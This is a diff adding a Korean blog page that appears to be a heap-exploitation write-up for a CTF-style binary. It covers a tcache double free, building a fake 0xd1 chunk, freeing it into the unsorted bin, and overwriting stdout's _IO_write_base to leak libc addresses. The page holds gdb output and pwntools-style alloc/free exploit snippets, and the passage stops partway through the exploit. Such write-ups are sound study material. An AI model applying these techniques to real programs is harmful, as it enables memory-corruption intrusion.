+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> hp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span> to_flush<span class="token punctuation">)</span> <span class="token operator">!=</span> to_flush<span class="token punctuation">)</span>
+	result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre></div>
+<h2 id="how-to-exploit-using-stdout" style="position:relative;"><a href="#how-to-exploit-using-stdout" aria-label="how to exploit using stdout permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>How to exploit using stdout</h2>
+<ul>
+<li>flags, _IO_write_base를 조작 한다.</li>
+<li>_IO_write_base를 하위 바이트만 조작하여 라이브러리 줏소가 위치한 주소를 가리키게 하여 라이브러리 주소를 출력할 수 있다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp">gdb<span class="token operator">-</span>peda$ p <span class="token operator">*</span><span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdout</span>
+$<span class="token number">5</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+  _flags <span class="token operator">=</span> <span class="token number">0xfbad2887</span><span class="token punctuation">,</span> 
+  _IO_read_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+  _IO_read_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+  _IO_read_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+  _IO_write_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+  _IO_write_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+  _IO_write_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+  _IO_buf_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+  _IO_buf_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd07e4</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+  _IO_save_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _IO_backup_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _IO_save_end <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _markers <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _chain <span class="token operator">=</span> <span class="token number">0x7ffff7dcfa00</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">></span><span class="token punctuation">,</span> 
+  _fileno <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">,</span> 
+  _flags2 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _old_offset <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span> 
+  _cur_column <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _vtable_offset <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _shortbuf <span class="token operator">=</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+  _lock <span class="token operator">=</span> <span class="token number">0x7ffff7dd18c0</span> <span class="token operator">&lt;</span>_IO_stdfile_1_lock<span class="token operator">></span><span class="token punctuation">,</span> 
+  _offset <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span> 
+  _codecvt <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _wide_data <span class="token operator">=</span> <span class="token number">0x7ffff7dcf8c0</span> <span class="token operator">&lt;</span>_IO_wide_data_1<span class="token operator">></span><span class="token punctuation">,</span> 
+  _freeres_list <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _freeres_buf <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  __pad5 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  _mode <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> 
+  _unused2 <span class="token operator">=</span> <span class="token string">'\000'</span> <span class="token operator">&lt;</span>repeats <span class="token number">19</span> times<span class="token operator">></span>
+<span class="token punctuation">}</span></code></pre></div>
+<ul>
+<li>해당 구조체를 덮어쓰기 위해서는 라이브러리 주소를 이용해야 한다.</li>
+<li>main_arena 영역 주소가 힙 청크에 남아야 하며 그렇게 하기 위해서는 unsorted bin을 이용해야 한다.</li>
+</ul>
+<h2 id="double-free-bug" style="position:relative;"><a href="#double-free-bug" aria-label="double free bug permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Double Free Bug</h2>
+<ul>
+<li>Double Free Bug가 발생하면 같은 포인터를 두 번 가리키며 새로 할당해 값을 쓰게 된다면 ForwarD PTR를 덮을 수 있다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">double</span> <span class="token expression">free test</span></span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token string">"BBBB"</span><span class="token punctuation">)</span></code></pre></div>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB20lEQVQoz32Qi46iUAyGfY2dkQNyO9wGkNsBHBEVFFQEwRtjRHF1J/v+L7BRJ9nERJM/TZP269+2sZiE8Tj2/KFlOzrSAMUSDOt4bts0MJIFFFR1xH2ogmLodsf1PILmMRIatsNJakMLVNMV7JmljC3t0xJVUUO8anAa4lmRBxTXJCFGQpyGgILNFovTHE5z97mN97HTlD5+dfS3oQWUPqAEjISAumKAuvYRDI8zP8k1v8F3NbDIxmUJ9ExshAjVJ2ieYOC9dodfqNEMEZDEt672HiBc6QNGxiihxUISQorn7p5PYVwWaSgLotmWPlltAHUk2UgxRUHmTMTSkCMorkVzxE2P8MARkCrFw/48HEaLkdYbsHqvpXQZQTMYEUFRg2L7FmVWAA9wuljmy20wmaWbTVkdt9VZ1m3D6Zb7Y1nVcZLhFCToH/NH52m+SpdlP5wkxaas6l190SzHdL3d8bw7nqdZgVPw6c1Jvs5WpR9O5qvt7nCqzt//4foyz1evHjbNlvNi64dxkq/L6rirL23LNtxueajLw2m2KHD6uXO63Obrr8F4mq3LfX0+XP7qlmt1evvTn/3v77RYv1rbCyI/iC3X88M4mqVxWkiqIesoSrIoWfSC0Yu1/wFrcZlBwWN9FQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./4.png"
+        title="./4.png"
+        src="/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png"
+        srcset="/static/086826f90fba136c03d4bc31a9fe97f5/e9ff0/4.png 180w,
+/static/086826f90fba136c03d4bc31a9fe97f5/f21e7/4.png 360w,
+/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png 720w,
+/static/086826f90fba136c03d4bc31a9fe97f5/ee455/4.png 863w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>FD 위치의 주소 값이 변경되어 4바이트의 0x42가 들어 가 tcache영역을 확인하게 되면 다음 주소 값이 변경된 것을 확인할 수 있겠다.</li>
+</ul>
+<h2 id="fake-chunk-구성" style="position:relative;"><a href="#fake-chunk-%EA%B5%AC%EC%84%B1" aria-label="fake chunk 구성 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Fake chunk 구성</h2>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">fake</span> <span class="token expression">chunk</span></span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0xd1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"AAAA"</span><span class="token punctuation">)</span></code></pre></div>
+<ul>
+<li>unsorted bin을 구성하기 위해서는 tcache를 사용하지 않게끔 7개의 bin을 꽉 채워야 하며 <code class="language-text">0x78</code> 크기 까지 할당할 수 있기 때문에 <code class="language-text">0x410</code> 초과의 크기만큼 할당한후 해제하여 unsorted bin으로 만드는 것은 불가능하다.</li>
+<li>Fake Chunk를 해제해 main_arena 영역의 주소를 써야 하며 Fake Chunk를 해제하기 위해서는 인접한 청크가 존재해야 한다.</li>
+<li>0x555555757260 + 0xd0 주소에 힙 청크가 존재해야 한다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 469px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 81.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAADAklEQVQoz0WT227cRBzG/QogVYqAIOWCCiEqkdIqTbzZXcdnj8/2jD3nGXvX2e6mm6VpqBoJcZC4gSskLvocIF6ASyTeCXkb1Af46Zvv983fiKZWOLXDJ5P5xAnsuLLxWt9cdd9u1Mu1erXi19GsfPrF1DlNmkThVOFMt4kiRR9OciMpWzQM8rc7+ctr/OtNuur75Yvlejest93ldrO7TUt09PDLmRMtnn+z2uwur14O691me1sQZkRhXu6G23/fvvn797t/3mZ3qyJDkAqEadUwKvT53H5wcHj8zKyYQIJDoWousNQhRUZcwLyhfgNdBGdFapGaXa35dsNfPG8uB3m9sYv0068emTDFm7W4XvPdFdtu9M0uQLURF3UOSV42Wdl4QXzu+GS5pMuB9F2OWaP01PU+/uzhE3MKicJcYdE1VGDeOT7YJyOalgjk6MKLzmZOw1TDFOYSMSX65cz2Pnjw0fGJCbluhWxF1zBF9SKIUwPkdQ5xUkCQQ9sH5txtuWqFxkIhppjuPZA+Pjkz505FBBaq5brhknXLMB1to6plWdXGBfSixLRcLDssOyJ1wzXTfVrCV6/f2AEoiSBSY9m1XLF+iEa4gCUiWYXiAnlReg+Le1j0g+1H333/48lkXlM1Jos9/C45qlDesqTGoKjHznOn5aoZxaiGjY+vW/LHn39FaVkRyXRP9YLITi5XICsMYLnACYDluj4I09K03BpzxBSiosKiZbJqyQ8//fxsMp86oR2AiyC+8CM3Sk+nlhHPndj2c8v1gjjKqnPbq1qGmKwxLVrWCmWH4MODTz5/dGz5wA6APcLABXsY1G2BRQpJUrV2AM5mztjqXWem5WKYOf7B4dFTc4bVgnc97waqF2pYx0VpxDnMIUlLFJeND1Jz7ux36ojQaC/McoODw6OvT88hHcfH74VlRlyisqF729ANk4nlYtHdw0yJxXsY8dHf//B+qjArsxrH+fhJ3DA5nV5AKsbDoLzCnKhuZnsHh0ePT8wKc0Q5pLImHMvOB8l/gQk8tL132WgAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./4_1.png"
+        title="./4_1.png"
+        src="/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png"
+        srcset="/static/2942358e137802a86bff75bb0928b56a/e9ff0/4_1.png 180w,
+/static/2942358e137802a86bff75bb0928b56a/f21e7/4_1.png 360w,
+/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png 469w"
+        sizes="(max-width: 469px) 100vw, 469px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span>
+    <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">"AAAA"</span><span class="token punctuation">)</span></code></pre></div>
+<ul>
+<li>0x555555757260+0xd0 주소에 청크가 존재해야 하며 해제할 시 정상적으로 해제가 가능하지만 아직 해제는 불가능 하다 정상적으로 할당된 청크가 아니기 때문이다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 471px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 34.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZ0lEQVQY0y3N626bMABAYd5imbRMTf9sUjfRpjSkSdM2EC4JYMB3x8bYxsmmvf8DTJ32AOd8Qb58yqK4fFzt3g5HAJ/f0qrHAPG6Q6eOtJjnFfj+I7z9dvfzMQ6jOIzWYRTfPz3fhVHQIAaZ6jAHmB/KapcU0npp/VkbgDmVw8t7+unLzTLecj0p5wd3lcab658W0aCBtKey6Und08OxftnnYrRcW6ENOY/K+fesnM0XD6sNkYYPo9COD0baC0AkqHrcEdF0pO5JUlTbfca1ZYMR2lBl9HRJ8uNsvrhfbZDUfBj5YKkapfUNxAGAFDIFIGsgy/7Ljmt7Hi1VVk/XpPiIH+INUR9HMTo2GOX+yS1miA8tYg3i2anZpYWyF2m8shPXk7n8TovTbL5YxlumnTJOGi9Gp/2vjrCgqNuqxWXdFXX/muTr1xQy2bMzYqIlgkq9S7LPX2/DaA2wgFRAJjvCW8z3WfkX2oSAkw6WmVAAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./5.png"
+        title="./5.png"
+        src="/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png"
+        srcset="/static/5864bba5e66045b88f0ec3e916611759/e9ff0/5.png 180w,
+/static/5864bba5e66045b88f0ec3e916611759/f21e7/5.png 360w,
+/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png 471w"
+        sizes="(max-width: 471px) 100vw, 471px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<h2 id="how-to-free" style="position:relative;"><a href="#how-to-free" aria-label="how to free permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>How to Free?</h2>
+<ul>
+<li>첫 번째 할당 때 FD의 한 바이트를  “\x70”으로 덮어 써 Fake Chunk의 데이터 부분을 가리키도록 한다. (FD: 0x555555757270)</li>
+<li>두 번 할당시 해당 영역에 할당 가능하다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyUlEQVQY04XN0W6EIBCFYZ+jKpAFmRFFBUZFZS80oU3f/4WabrxtN/nvJt+ZIp5jevbpe53zHFLoXedXQ5uh3WDfMolc/VlRfsV6tFXyZSZBlwArGhANiuY/duMqr9z2LFGdF+5PoS1X8JbduM6RDV2VQvlJ3J9MDeyB7HV7+7z4mAYBg7Rk/CGnrMOBPoyErdU+6gdCLbFWd7+jEl5pLqGIhMs0XDFdYduvvZ0XnJNySRlHYFbsHHRWGwtm1C30jlMS4eBuk2b8AWAVOjAt2/WtAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./6.png"
+        title="./6.png"
+        src="/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png"
+        srcset="/static/e6dfc16b39d3dfac66363bbec59aee3d/e9ff0/6.png 180w,
+/static/e6dfc16b39d3dfac66363bbec59aee3d/f21e7/6.png 360w,
+/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png 720w,
+/static/e6dfc16b39d3dfac66363bbec59aee3d/914ae/6.png 860w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>FD를 Fake Chunk의 주소 값으로 조작하여 첫 번째 tcache가 Fake chunk의 주소 값을 가리키는 것을 확인할 수 있다.</li>
+<li>두 번 할당시 해당 영역에 할당 가능하다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">fake</span> <span class="token expression">chunk</span></span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0xd1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span>
+    <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+# <span class="token number">0xd1</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">-></span> Fake chunk
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token function">p8</span><span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"BBBB"</span><span class="token punctuation">)</span></code></pre></div>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 582px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 75.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAACoklEQVQoz33SW3LbNhQG4CyksWTrEkmxnciyTV0si5IpixRBiiAAEiBIkOBF98ROm5esoJPOdCmd6RI7GjdtlIcs4Jtz/vOfV49K3+j0hu3+ZGLeDO6BRw3HNSAeTmdnrYvT1nm7f3epdM9vlAul22h3TitvarVmqdooVRuv5iYkv66iPz7T3z+BTcxWS5KnUCZOHLVHw+pVG8kkWK3YquDrNYhYudk6qbz5F0MUZH9+ef7r68e/v5Lf1nFcxOmShWkQyvaVcto859u1fH6ST/vs+Ylui7OLi5Ozbxi4no2o7uCxDibETT59iPbbYLti66IzUavKDY4ET4tAZlG+sjApVeov8oB1C1rQMy00mc4Hqoa4gDQAiBgL97JzW663TAe7HoceQzQ0LKf0becDNh1iuZ5hQU23VM1gQpJAYBYin7/rKOX6W5dyP0z8MKZC2sgr1xr/Y8wiFklEQ9PB07mdb/dyuck2u3yzv+7dlWstnuTpei9Xm3zzwQ/FETYhcQizXF8zrPuHWRCnL0OYkO+vlZNKA9EwiHMmJE9y6NEjPNUtAzhT3RzPzP7owaUcEoYod/3g6rZfa13OLAdAAiC2sa8Z4CgzuFPtO3WqanOHqDMDceF4AaSh7bHRVO8Nx331YTDSusNxdzjuKINy9bvJiAs/SrksHELBo7XLtokfhZhzyHo3/dfVhsiWcrllkfR5ssD0rN46qfxX1cIF0FtgOjXtSFs8hcWGiCWKdkjoyuiXatMhzOMxYaHHYwDxUWbdcgE8tPVgAHX8yHlMWRQEImDi6rpbqjWB67n+4QSYhfOFe4RtRB18eIC57Y4e5zwtfCFZkrEke3/bK9dbhAue5EGchmnx47UxEzSUQZxZrqcZ1kvP6XqXrXfXvcHPe/4H6gX+guCc2pUAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./6_1.png"
+        title="./6_1.png"
+        src="/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png"
+        srcset="/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/e9ff0/6_1.png 180w,
+/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/f21e7/6_1.png 360w,
+/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png 582w"
+        sizes="(max-width: 582px) 100vw, 582px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>포인터 배열 6번째 인덱스에 Fake chunk가 할당된 모습을 확인할 수 있다.</li>
+<li>해제를 세 번 한 이유는 <code class="language-text">tcache->counts</code> 가 underflow 되는 것을 막기 위해서이다.</li>
+<li>free시 tcache→counts++</li>
+<li>malloc시 tcache→counts—</li>
+<li>만약 할당 과정에서 두 개의 tcache를 사용하게 된다면 다음 할당 과정에서 음수 처리가 되지 않기 때문에  255 변환되어 underflow되어 tcache를 사용하지 않는다.</li>
+<li>tcache는 7개 bin만을 관리하기 때문이다.</li>
+</ul>
+<h2 id="free-fake-chunk" style="position:relative;"><a href="#free-fake-chunk" aria-label="free fake chunk permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Free Fake chunk</h2>
+<ul>
+<li><code class="language-text">0xd0</code> 크기 또한 tcache에서 관리하기 때문에 unsorted bin이 되지 못한다.</li>
+<li>해당 청크를 8번 해제하면 마지막 해제할 때 unsorted bin이 되어 tcache escape가 가능하다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">fake</span> <span class="token expression">chunk</span></span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0xd1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span>
+    <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
